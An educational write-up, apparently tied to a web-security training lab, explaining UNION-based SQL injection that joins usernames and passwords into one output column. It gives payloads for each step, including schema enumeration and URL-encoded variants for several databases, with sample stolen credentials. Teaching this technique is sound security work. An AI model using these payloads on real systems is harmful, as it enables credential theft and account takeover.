## The Problem

The original query only returns **1 column** that can hold string data. You need to steal **both** usernames **and** passwords, but you only have **one column** to put them in.

## The Solution

**Concatenate (join)** the username and password together into a **single string** inside that one column.

## Example

**Instead of:**
```sql
' UNION SELECT username, password FROM users --  (needs 2 columns)
```

**You do:**
```sql
' UNION SELECT username || '~' || password FROM users --  (needs 1 column)
```

## What You See in the Response

| Before (1 column) | After (1 column with concatenation) |
|-------------------|--------------------------------------|
| administrator | administrator~s3cure |
| wiener | wiener~bluecheese |
| carlos | carlos~montoya |

The `~` acts as a separator so you can tell where the username ends and password begins.

## String Concatenation by Database

| Database | Operator | Example |
|----------|----------|---------|
| Oracle, PostgreSQL | `||` | `'a' || 'b'` → `'ab'` |
| SQL Server | `+` | `'a' + 'b'` → `'ab'` |
| MySQL | `CONCAT()` | `CONCAT('a','b')` → `'ab'` |
| MySQL (alternative) | `||` (if PIPES_AS_CONCAT mode is on) | `'a' || 'b'` |

## One Sentence Summary

When you only have **one string column**, combine username and password using `||` (or `CONCAT()`) with a separator like `~` to steal both in a single column.

---
# How Hackers Do it

Here's exactly how a hacker would do it, step by step, in the real world.

---

## The Scenario

**You know:**
- Original query returns **1 column** (not 2)
- That 1 column accepts strings
- You need to steal `username` and `password` from `users` table

**The problem:** You only have 1 column to put data into.

**The solution:** Merge (concatenate) username and password into a single string.

---

## Step-by-Step Hacker Approach

### Step 1: Confirm only 1 column exists

```
' UNION SELECT NULL --
```
Works with 1 NULL → only 1 column

```
' UNION SELECT NULL, NULL --
```
Fails with 2 NULLs → confirmed 1 column

---

### Step 2: Confirm column accepts strings

```
' UNION SELECT 'hacked' --
```
You see `hacked` in the response → column accepts strings

---

### Step 3: Find table names (same as before)

```
' UNION SELECT table_name FROM information_schema.tables --
```
You find: `users`

---

### Step 4: Find column names

```
' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --
```
You find: `username`, `password`

---

### Step 5: Steal credentials using concatenation

**For PostgreSQL or Oracle:**
```sql
' UNION SELECT username || '~' || password FROM users --
```

**For MySQL:**
```sql
' UNION SELECT CONCAT(username, '~', password) FROM users --
```

**For SQL Server:**
```sql
' UNION SELECT username + '~' + password FROM users --
```

---

### Step 6: What the hacker sees in response

The webpage shows:

```
administrator~8x9kL3pQ2mR7
wiener~bluecheese
carlos~montoya
peter~letmein
admin~password123
```

The hacker now has **all credentials** in one neat list.

---

### Step 7: Parse the results

The hacker splits each line at the `~`:

| Username | Password |
|----------|----------|
| administrator | 8x9kL3pQ2mR7 |
| wiener | bluecheese |
| carlos | montoya |

Then logs in as `administrator`.

---

## Real-World Payload (URL Encoded)

**PostgreSQL/ Oracle:**
```
%27%20UNION%20SELECT%20username%20%7C%7C%20%27~%27%20%7C%7C%20password%20FROM%20users%20--
```

**MySQL:**
```
%27%20UNION%20SELECT%20CONCAT(username%2C%20%27~%27%2C%20password)%20FROM%20users%20--
```

---

## Hacker's Mental Flowchart

```
Only 1 column available?
    ↓
YES → Concatenate data into that 1 column
    ↓
Choose separator (~, :, |, -)
    ↓
username || '~' || password
    ↓
administrator~8x9kL3pQ2mR7
    ↓
Parse and use credentials
```

---

## Why Hackers Love This

| Without concatenation | With concatenation |
|----------------------|--------------------|
| Need 2 string columns | Need 1 string column |
| Attack fails if only 1 column | Attack always works |
| Can't steal multiple values | Steals everything in one column |

---

## One Sentence Summary

Hackers use `||` (or `CONCAT()`) to merge username and password into one string with a separator like `~`, then steal everything through a single vulnerable column.